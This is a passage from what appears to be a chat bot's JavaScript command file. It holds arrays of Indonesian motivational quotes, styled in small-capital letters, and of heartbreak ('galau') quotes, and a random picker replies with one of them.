"ᴊɪᴋᴀ ᴋɪᴛᴀ ᴛᴇʀᴜꜱ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ʟᴀᴋᴜᴋᴀɴ, ᴋɪᴛᴀ ᴀᴋᴀɴ ᴛᴇʀᴜꜱ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴊɪᴋᴀ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱᴛʀᴇꜱ, ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴍᴇɴɢᴇʟᴏʟᴀ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ.",
"ʙᴇʀꜱɪᴋᴀᴘ ᴋᴇʀᴀꜱ ᴋᴇᴘᴀʟᴀ ᴛᴇɴᴛᴀɴɢ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴅᴀɴ ꜰʟᴇᴋꜱɪʙᴇʟ ᴛᴇɴᴛᴀɴɢ ᴍᴇᴛᴏᴅᴇ ᴀɴᴅᴀ.",
"ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ᴍᴇɴɢᴀʟᴀʜᴋᴀɴ ʙᴀᴋᴀᴛ ᴋᴇᴛɪᴋᴀ ʙᴀᴋᴀᴛ ᴛɪᴅᴀᴋ ʙᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ.",
"ɪɴɢᴀᴛʟᴀʜ ʙᴀʜᴡᴀ ᴘᴇʟᴀᴊᴀʀᴀɴ ᴛᴇʀʙᴇꜱᴀʀ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ʙɪᴀꜱᴀɴʏᴀ ᴅɪᴘᴇʟᴀᴊᴀʀɪ ᴅᴀʀɪ ꜱᴀᴀᴛ-ꜱᴀᴀᴛ ᴛᴇʀʙᴜʀᴜᴋ ᴅᴀɴ ᴅᴀʀɪ ᴋᴇꜱᴀʟᴀʜᴀɴ ᴛᴇʀʙᴜʀᴜᴋ.",
"ʜɪᴅᴜᴘ ʙᴜᴋᴀɴ ᴛᴇɴᴛᴀɴɢ ᴍᴇɴᴜɴɢɢᴜ ʙᴀᴅᴀɪ ʙᴇʀʟᴀʟᴜ, ᴛᴇᴛᴀᴘɪ ʙᴇʟᴀᴊᴀʀ ᴍᴇɴᴀʀɪ ᴅɪ ᴛᴇɴɢᴀʜ ʜᴜᴊᴀɴ.",
"ᴊɪᴋᴀ ʀᴇɴᴄᴀɴᴀɴʏᴀ ᴛɪᴅᴀᴋ ʙᴇʀʜᴀꜱɪʟ, ᴜʙᴀʜ ʀᴇɴᴄᴀɴᴀɴʏᴀ ʙᴜᴋᴀɴ ᴛᴜᴊᴜᴀɴɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴀᴋᴀɴ ʙᴇʀᴀᴋʜɪʀ; ᴛᴀᴋᴜᴛʟᴀʜ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴛᴀᴋ ᴘᴇʀɴᴀʜ ᴅɪᴍᴜʟᴀɪ.",
"ᴏʀᴀɴɢ ʏᴀɴɢ ʙᴇɴᴀʀ-ʙᴇɴᴀʀ ʜᴇʙᴀᴛ ᴀᴅᴀʟᴀʜ ᴏʀᴀɴɢ ʏᴀɴɢ ᴍᴇᴍʙᴜᴀᴛ ꜱᴇᴛɪᴀᴘ ᴏʀᴀɴɢ ᴍᴇʀᴀꜱᴀ ʜᴇʙᴀᴛ.",
"ᴘᴇɴɢᴀʟᴀᴍᴀɴ ᴀᴅᴀʟᴀʜ ɢᴜʀᴜ ʏᴀɴɢ ʙᴇʀᴀᴛ ᴋᴀʀᴇɴᴀ ᴅɪᴀ ᴍᴇᴍʙᴇʀɪᴋᴀɴ ᴛᴇꜱ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ, ᴋᴇᴍᴜᴅɪᴀɴ ᴘᴇʟᴀᴊᴀʀᴀɴɴʏᴀ.",
"ᴍᴇɴɢᴇᴛᴀʜᴜɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴀɴʏᴀᴋ ʏᴀɴɢ ᴘᴇʀʟᴜ ᴅɪᴋᴇᴛᴀʜᴜɪ ᴀᴅᴀʟᴀʜ ᴀᴡᴀʟ ᴅᴀʀɪ ʙᴇʟᴀᴊᴀʀ ᴜɴᴛᴜᴋ ʜɪᴅᴜᴘ.",
"ꜱᴜᴋꜱᴇꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴋʜɪʀ, ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ꜰᴀᴛᴀʟ. ʏᴀɴɢ ᴛᴇʀᴘᴇɴᴛɪɴɢ ᴀᴅᴀʟᴀʜ ᴋᴇʙᴇʀᴀɴɪᴀɴ ᴜɴᴛᴜᴋ ᴍᴇʟᴀɴᴊᴜᴛᴋᴀɴ.",
"ʟᴇʙɪʜ ʙᴀɪᴋ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ᴏʀɪꜱɪɴᴀʟɪᴛᴀꜱ ᴅᴀʀɪᴘᴀᴅᴀ ʙᴇʀʜᴀꜱɪʟ ᴍᴇɴɪʀᴜ.",
"ʙᴇʀᴀɴɪ ʙᴇʀᴍɪᴍᴘɪ, ᴛᴀᴘɪ ʏᴀɴɢ ʟᴇʙɪʜ ᴘᴇɴᴛɪɴɢ, ʙᴇʀᴀɴɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴛɪɴᴅᴀᴋᴀɴ ᴅɪ ʙᴀʟɪᴋ ɪᴍᴘɪᴀɴᴍᴜ.",
"ᴛᴇᴛᴀᴘᴋᴀɴ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴛɪɴɢɢɪ-ᴛɪɴɢɢɪ, ᴅᴀɴ ᴊᴀɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ᴍᴇɴᴄᴀᴘᴀɪɴʏᴀ.",
"ᴋᴇᴍʙᴀɴɢᴋᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀʀɪ ᴋᴇɢᴀɢᴀʟᴀɴ. ᴋᴇᴘᴜᴛᴜꜱᴀꜱᴀᴀɴ ᴅᴀɴ ᴋᴇɢᴀɢᴀʟᴀɴ ᴀᴅᴀʟᴀʜ ᴅᴜᴀ ʙᴀᴛᴜ ʟᴏɴᴄᴀᴛᴀɴ ᴘᴀʟɪɴɢ ᴘᴀꜱᴛɪ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ.",
"ᴊᴇɴɪᴜꜱ ᴀᴅᴀʟᴀʜ ꜱᴀᴛᴜ ᴘᴇʀꜱᴇɴ ɪɴꜱᴘɪʀᴀꜱɪ ᴅᴀɴ ꜱᴇᴍʙɪʟᴀɴ ᴘᴜʟᴜʜ ꜱᴇᴍʙɪʟᴀɴ ᴘᴇʀꜱᴇɴ ᴋᴇʀɪɴɢᴀᴛ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴛᴇᴍᴘᴀᴛ ᴘᴇʀꜱɪᴀᴘᴀɴ ᴅᴀɴ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ʙᴇʀᴛᴇᴍᴜ.",
"ᴋᴇᴛᴇᴋᴜɴᴀɴ ɢᴀɢᴀʟ 19 ᴋᴀʟɪ ᴅᴀɴ ʙᴇʀʜᴀꜱɪʟ ᴘᴀᴅᴀ ᴋᴇꜱᴇᴍᴘᴀᴛᴀᴍ ʏᴀɴɢ ᴋᴇ-20.",
"ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ ᴅᴀɴ ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ᴋᴇɢᴀɢᴀʟᴀɴ ʜᴀᴍᴘɪʀ ᴘᴇʀꜱɪꜱ ꜱᴀᴍᴀ.",
"ꜱᴜᴋꜱᴇꜱ ʙɪᴀꜱᴀɴʏᴀ ᴅᴀᴛᴀɴɢ ᴋᴇᴘᴀᴅᴀ ᴍᴇʀᴇᴋᴀ ʏᴀɴɢ ᴛᴇʀʟᴀʟᴜ ꜱɪʙᴜᴋ ᴍᴇɴᴄᴀʀɪɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴜɴᴅᴀ ᴘᴇᴋᴇʀᴊᴀᴀɴᴍᴜ ꜱᴀᴍᴘᴀɪ ʙᴇꜱᴏᴋ, ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇɴɢᴇʀᴊᴀᴋᴀɴɴʏᴀ ʜᴀʀɪ ɪɴɪ.",
"20 ᴛᴀʜᴜɴ ᴅᴀʀɪ ꜱᴇᴋᴀʀᴀɴɢ, ᴋᴀᴜ ᴍᴜɴɢᴋɪɴ ʟᴇʙɪʜ ᴋᴇᴄᴇᴡᴀ ᴅᴇɴɢᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴛɪᴅᴀᴋ ꜱᴇᴍᴘᴀᴛ ᴋᴀᴜ ʟᴀᴋᴜᴋᴀɴ ᴀʟɪʜ-ᴀʟɪʜ ʏᴀɴɢ ꜱᴜᴅᴀʜ.",
"ᴊᴀɴɢᴀɴ ʜᴀʙɪꜱᴋᴀɴ ᴡᴀᴋᴛᴜᴍᴜ ᴍᴇᴍᴜᴋᴜʟɪ ᴛᴇᴍʙᴏᴋ ᴅᴀɴ ʙᴇʀʜᴀʀᴀᴘ ʙɪꜱᴀ ᴍᴇɴɢᴜʙᴀʜɴʏᴀ ᴍᴇɴᴊᴀᴅɪ ᴘɪɴᴛᴜ.",
"ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ɪᴛᴜ ᴍɪʀɪᴘ ꜱᴇᴘᴇʀᴛɪ ᴍᴀᴛᴀʜᴀʀɪ ᴛᴇʀʙɪᴛ. ᴋᴀʟᴀᴜ ᴋᴀᴜ ᴍᴇɴᴜɴɢɢᴜ ᴛᴇʀʟᴀʟᴜ ʟᴀᴍᴀ, ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇʟᴇᴡᴀᴛᴋᴀɴɴʏᴀ.",
"ʜɪᴅᴜᴘ ɪɴɪ ᴛᴇʀᴅɪʀɪ ᴅᴀʀɪ 10 ᴘᴇʀꜱᴇɴ ᴀᴘᴀ ʏᴀɴɢ ᴛᴇʀᴊᴀᴅɪ ᴘᴀᴅᴀᴍᴜ ᴅᴀɴ 90 ᴘᴇʀꜱᴇɴ ʙᴀɢᴀɪᴍᴀɴᴀ ᴄᴀʀᴀᴍᴜ ᴍᴇɴʏɪᴋᴀᴘɪɴʏᴀ.",
"ᴀᴅᴀ ᴛɪɢᴀ ᴄᴀʀᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴄᴀᴘᴀɪ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴛᴇʀᴛɪɴɢɢɪ: ᴄᴀʀᴀ ᴘᴇʀᴛᴀᴍᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴅᴜᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴛɪɢᴀ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴊᴀᴅɪ ʙᴀɪᴋ.",
"ᴀʟᴀꜱᴀɴ ɴᴏᴍᴏʀ ꜱᴀᴛᴜ ᴏʀᴀɴɢ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ᴀᴅᴀʟᴀʜ ᴋᴀʀᴇɴᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴᴅᴇɴɢᴀʀᴋᴀɴ ᴛᴇᴍᴀɴ, ᴋᴇʟᴜᴀʀɢᴀ, ᴅᴀɴ ᴛᴇᴛᴀɴɢɢᴀ ᴍᴇʀᴇᴋᴀ.",
"ᴡᴀᴋᴛᴜ ʟᴇʙɪʜ ʙᴇʀʜᴀʀɢᴀ ᴅᴀʀɪᴘᴀᴅᴀ ᴜᴀɴɢ. ᴋᴀᴍᴜ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴜᴀɴɢ, ᴛᴇᴛᴀᴘɪ ᴋᴀᴍᴜ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴡᴀᴋᴛᴜ.",
"ᴘᴇɴᴇᴛᴀᴘᴀɴ ᴛᴜᴊᴜᴀɴ ᴀᴅᴀʟᴀʜ ʀᴀʜᴀꜱɪᴀ ᴍᴀꜱᴀ ᴅᴇᴘᴀɴ ʏᴀɴɢ ᴍᴇɴᴀʀɪᴋ.",
"ꜱᴀᴀᴛ ᴋɪᴛᴀ ʙᴇʀᴜꜱᴀʜᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ ᴅᴀʀɪ ᴋɪᴛᴀ, ꜱᴇɢᴀʟᴀ ꜱᴇꜱᴜᴀᴛᴜ ᴅɪ ꜱᴇᴋɪᴛᴀʀ ᴋɪᴛᴀ ᴊᴜɢᴀ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ.",
"ᴘᴇʀᴛᴜᴍʙᴜʜᴀɴ ᴅɪᴍᴜʟᴀɪ ᴋᴇᴛɪᴋᴀ ᴋɪᴛᴀ ᴍᴜʟᴀɪ ᴍᴇɴᴇʀɪᴍᴀ ᴋᴇʟᴇᴍᴀʜᴀɴ ᴋɪᴛᴀ ꜱᴇɴᴅɪʀɪ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ʜᴀʟ ᴘᴇʀᴛᴀᴍᴀ ʏᴀɴɢ ᴅɪʟᴀᴋᴜᴋᴀɴ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴀɴᴅᴀɴɢ ᴋᴇɢᴀɢᴀʟᴀɴ ꜱᴇʙᴀɢᴀɪ ꜱɪɴʏᴀʟ ᴘᴏꜱɪᴛɪꜰ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ.",
"ᴄɪʀɪ ᴋʜᴀꜱ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇʀᴇᴋᴀ ꜱᴇʟᴀʟᴜ ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴜɴᴛᴜᴋ ᴍᴇᴍᴘᴇʟᴀᴊᴀʀɪ ʜᴀʟ-ʜᴀʟ ʙᴀʀᴜ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ɪɴɢɪɴᴋᴀɴ, ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴍᴇɴɢɪɴɢɪɴᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴏʀᴀɴɢ ᴘᴇꜱɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴋᴇꜱᴜʟɪᴛᴀɴ ᴅɪ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ. ᴏʀᴀɴɢ ʏᴀɴɢ ᴏᴘᴛɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴘᴇʟᴜᴀɴɢ ᴅᴀʟᴀᴍ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴜʟɪᴛᴀɴ.",
"ᴋᴇʀᴀɢᴜᴀɴ ᴍᴇᴍʙᴜɴᴜʜ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴍɪᴍᴘɪ ᴅᴀʀɪᴘᴀᴅᴀ ᴋᴇɢᴀɢᴀʟᴀɴ.",
"ʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ʜᴀʀᴜꜱ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ ꜱᴀᴍᴘᴀɪ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ɪɴɢɪɴ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ.",
"ᴏᴘᴛɪᴍɪꜱᴛɪꜱ ᴀᴅᴀʟᴀʜ ꜱᴀʟᴀʜ ꜱᴀᴛᴜ ᴋᴜᴀʟɪᴛᴀꜱ ʏᴀɴɢ ʟᴇʙɪʜ ᴛᴇʀᴋᴀɪᴛ ᴅᴇɴɢᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀɴ ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴅᴀʀɪᴘᴀᴅᴀ ʏᴀɴɢ ʟᴀɪɴ.",
"ᴘᴇɴɢʜᴀʀɢᴀᴀɴ ᴘᴀʟɪɴɢ ᴛɪɴɢɢɪ ʙᴀɢɪ ꜱᴇᴏʀᴀɴɢ ᴘᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴘᴀ ʏᴀɴɢ ᴅɪᴀ ᴘᴇʀᴏʟᴇʜ ᴅᴀʀɪ ᴘᴇᴋᴇʀᴊᴀᴀɴ ɪᴛᴜ, ᴛᴀᴘɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴇʀᴋᴇᴍʙᴀɴɢ ɪᴀ ᴅᴇɴɢᴀɴ ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱɴʏᴀ ɪᴛᴜ.",
"ᴄᴀʀᴀ ᴛᴇʀʙᴀɪᴋ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴀᴅᴀʟᴀʜ ᴅᴇɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ʙᴇʀʙɪᴄᴀʀᴀ ᴅᴀɴ ᴍᴜʟᴀɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ.",
"ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴜꜱᴜʟ ᴊɪᴋᴀ ᴛᴇᴋᴀᴅ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ ᴄᴜᴋᴜᴘ ᴋᴜᴀᴛ."
]
let motivasii = pickRandom(motivasi)
    reply(`"${motivasii}"`)
}
break
//=========================================\\======
case 'quotesgalau': {
  function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const galau = [
    "Gak salah kalo aku lebih berharap sama orang yang lebih pasti tanpa khianati janji-janji",
    "Kalau aku memang tidak sayang sama kamu ngapain aku mikirin kamu. Tapi semuanya kamu yang ngganggap aku gak sayang sama kamu",
    "Jangan iri dan sedih jika kamu tidak memiliki kemampuan seperti yang orang miliki. Yakinlah orang lain juga tidak memiliki kemampuan sepertimu",
    "Hanya kamu yang bisa membuat langkahku terhenti, sambil berkata dalam hati mana bisa aku meninggalkanmu",
    "Tetap tersenyum walaluku masih dibuat menunggu dan rindu olehmu, tapi itu demi kamu",
    "Tak semudah itu melupakanmu",
    "Secuek-cueknya kamu ke aku, aku tetap sayang sama kamu karena kamu telah menerima aku apa adanya",
    "Aku sangat bahagia jika kamu bahagia didekatku, bukan didekatnya",
    "Jadilah diri sendiri, jangan mengikuti orang lain, tetapi tidak sanggup untuk menjalaninya",
    "Cobalah terdiam sejenak untuk memikirkan bagaimana caranya agar kita dapat menyelesaikan masalah ini bersama-sama",
    "Bisakah kita tidak bermusuhan setelah berpisah, aku mau kita seperti dulu sebelum kita jadian yang seru-seruan bareng, bercanda dan yang lainnya",
    "Aku ingin kamu bisa langgeng sama aku dan yang aku harapkan kamu bisa jadi jodohku",
    "Cinta tak bisa dijelaskan dengan kata-kata saja, karena cinta hanya mampu dirasakan oleh hati",
    "Masalah terbesar dalam diri seseorang adalah tak sanggup melawan rasa takutnya",
    "Selamat pagi buat orang yang aku sayang dan orang yang membenciku, semoga hari ini hari yang lebih baik daripada hari kemarin buat aku dan kamu",
    "Jangan menyerah dengan keadaanmu sekarang, optimis karena optimislah yang bikin kita kuat",
    "Kepada pria yang selalu ada di doaku aku mencintaimu dengan tulus apa adanya",
    "Tolong jangan pergi saat aku sudah sangat sayang padamu",
    "Coba kamu yang berada diposisiku, lalu kamu ditinggalin gitu aja sama orang yang lo sayang banget",
    "Aku takut kamu kenapa-napa, aku panik jika kamu sakit, itu karena aku cinta dan sayang padamu",
    "Sakit itu ketika cinta yang aku beri tidak kamu hargai",
    "Kamu tiba-tiba berubah tanpa sebab tapi jika memang ada sebabnya kamu berubah tolong katakan biar saya perbaiki kesalahan itu",
    "Karenamu aku jadi tau cinta yang sesungguhnya",
    "Senyum manismu sangatlah indah, jadi janganlah sampai kamu bersedih",
    "Berawal dari kenalan, bercanda bareng, ejek-ejekan kemudian berubah menjadi suka, nyaman dan akhirnya saling sayang dan mencintai",
    "Tersenyumlah pada orang yang telah menyakitimu agar sia tau arti kesabaran yang luar biasa",
    "Aku akan ingat kenangan pahit itu dan aku akan jadikan pelajaran untuk masa depan yang manis",
    "Kalau memang tak sanggup menepati janjimu itu setidaknya kamu ingat dan usahakan jagan membiarkan janjimu itu sampai kau lupa",
    "Hanya bisa diam dan berfikir Kenapa orang yang setia dan baik ditinggalin yang nakal dikejar-kejar giliran ditinggalin bilangnya laki-laki itu semuanya sama",
    "Walaupun hanya sesaat saja kau membahagiakanku tapi rasa bahagia yang dia tidak cepat dilupakan",
    "Aku tak menyangka kamu pergi dan melupakan ku begitu cepat",
    "Jomblo gak usah diam rumah mumpung malam minggu ya keluar jalan lah kan jomblo bebas bisa dekat sama siapapun pacar orang mantan sahabat bahkan sendiri atau bareng setan pun bisa",
    "Kamu adalah teman yang selalu di sampingku dalam keadaan senang maupun susah Terimakasih kamu selalu ada di sampingku",
    "Aku tak tahu sebenarnya di dalam hatimu itu ada aku atau dia",
    "Tak mudah melupakanmu karena aku sangat mencintaimu meskipun engkau telah menyakiti aku berkali-kali",
    "Hidup ini hanya sebentar jadi lepaskan saja mereka yang menyakitimu Sayangi Mereka yang peduli padamu dan perjuangan mereka yang berarti bagimu",
    "Tolong jangan pergi meninggalkanku aku masih sangat mencintai dan menyayangimu",
    "Saya mencintaimu dan menyayangimu jadi tolong jangan engkau pergi dan meninggalkan ku sendiri",
    "Saya sudah cukup tahu bagaimana sifatmu itu kamu hanya dapat memberikan harapan palsu kepadaku",
    "Aku berusaha mendapatkan cinta darimu tetapi Kamunya nggak peka",
    "Aku bangkit dari jatuh ku setelah kau jatuhkan aku dan aku akan memulainya lagi dari awal Tanpamu",
    "Mungkin sekarang jodohku masih jauh dan belum bisa aku dapat tapi aku yakin jodoh itu Takkan kemana-mana dan akan ku dapatkan",
    "Datang aja dulu baru menghina orang lain kalau memang dirimu dan lebih baik dari yang kau hina",
    "Membelakanginya mungkin lebih baik daripada melihatnya selingkuh didepan mata sendiri",
    "Bisakah hatimu seperti angsa yang hanya setia pada satu orang saja",
    "Aku berdiri disini sendiri menunggu kehadiran dirimu",
    "Aku hanya tersenyum padamu setelah kau menyakitiku agar kamu tahu arti kesabaran",
    "Maaf aku lupa ternyata aku bukan siapa-siapa",
    "Untuk memegang janjimu itu harus ada buktinya jangan sampai hanya janji palsu",
    "Aku tidak bisa selamanya menunggu dan kini aku menjadi ragu Apakah kamu masih mencintaiku",
    "Jangan buat aku terlalu berharap jika kamu tidak menginginkanku",
    "Lebih baik sendiri daripada berdua tapi tanpa kepastian",
    "Pergi bukan berarti berhenti mencintai tapi kecewa dan lelah karena harus berjuang sendiri",
    "Bukannya aku tidak ingin menjadi pacarmu Aku hanya ingin dipersatukan dengan cara yang benar",
    "Akan ada saatnya kok aku akan benar-benar lupa dan tidak memikirkan mu lagi",
    "Kenapa harus jatuh cinta kepada orang yang tak bisa dimiliki",
    "Jujur aku juga memiliki perasaan terhadapmu dan tidak bisa menolakmu tapi aku juga takut untuk mencintaimu",
    "Maafkan aku sayang tidak bisa menjadi seperti yang kamu mau",
    "Jangan memberi perhatian lebih seperti itu cukup biasa saja tanpa perlu menimbulkan rasa",
    "Aku bukan mencari yang sempurna tapi yang terbaik untukku",
    "Sendiri itu tenang tidak ada pertengkaran kebohongan dan banyak aturan",
    "Cewek strong itu adalah yang sabar dan tetap tersenyum meskipun dalam keadaan terluka",
    "Terima kasih karena kamu aku menjadi lupa tentang masa laluku",
    "Cerita cinta indah tanpa masalah itu hanya di dunia dongeng saja",
    "Kamu tidak akan menemukan apa-apa di masa lalu Yang ada hanyalah penyesalan dan sakit hati",
    "Mikirin orang yang gak pernah mikirin kita itu emang bikin gila",
    "Dari sekian lama menunggu apa yang sudah didapat",
    "Perasaan Bodo gue adalah bisa jatuh cinta sama orang yang sama meski udah disakiti berkali-kali",
    "Yang sendiri adalah yang bersabar menunggu pasangan sejatinya",
    "Aku terlahir sederhana dan ditinggal sudah biasa",
    "Aku sayang kamu tapi aku masih takut untuk mencintaimu",
    "Bisa berbagi suka dan duka bersamamu itu sudah membuatku bahagia",
    "Aku tidak pernah berpikir kamu akan menjadi yang sementara",
    "Jodoh itu bukan seberapa dekat kamu dengannya tapi seberapa yakin kamu dengan Allah",
    "Jangan paksa aku menjadi cewek seperti seleramu",
    "Hanya yang sabar yang mampu melewati semua kekecewaan",
    "Balikan sama kamu itu sama saja bunuh diri dan melukai perasaan ku sendiri",
    "Tak perlu membalas dengan menyakiti biar Karma yang akan urus semua itu",
    "Aku masih ingat kamu tapi perasaanku sudah tidak sakit seperti dulu",
